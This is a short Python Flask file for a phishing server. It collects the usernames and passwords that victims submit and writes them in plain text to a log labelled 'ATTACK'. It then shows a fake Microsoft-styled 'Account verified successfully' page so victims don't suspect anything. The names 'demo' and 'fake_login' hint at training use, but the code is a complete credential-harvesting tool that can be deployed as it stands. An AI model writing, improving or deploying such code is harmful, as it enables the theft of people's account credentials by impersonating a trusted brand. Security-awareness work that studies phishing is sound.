from flask import Flask , request
from datetime import datetime

app = Flask(__name__)

@app.route('/' , methods=['GET' , 'POST'])
def fake_login ():
    if request.method == 'POST' :
        username = request.form.get('username', 'Unknown')
        password = request.form.get('password', 'Unknown')

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f" {timestamp} | ATTACK : {username} | {password} | victim clicked link"

        with open('logs/phishing_logs.txt' , 'a') as f:
            f.write(log_entry + '\n')

        return """
<html><head><title>Account Verification</title></head>
<body style='background:#f3f2f1;padding:60px;text-align:center;font-family:Segoe UI;'>
    <div style='background:white;max-width:400px;margin:auto;padding:40px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.1);'>
        <h2 style='color:#605e5c;margin-bottom:20px;'>Account verified successfully</h2>
        <p style='color:#107c10;'>Your Microsoft account is now secure.</p>
        <p style='color:#666;font-size:14px;margin-top:30px;'>Return to your application.</p>
    </div>
</body></html>
"""
    with open ('templates/demo.html' , 'r') as f :
        return f.read()

if __name__ == '__main__' :
    app.run(debug=True ,   host='0.0.0.0' , port=3000)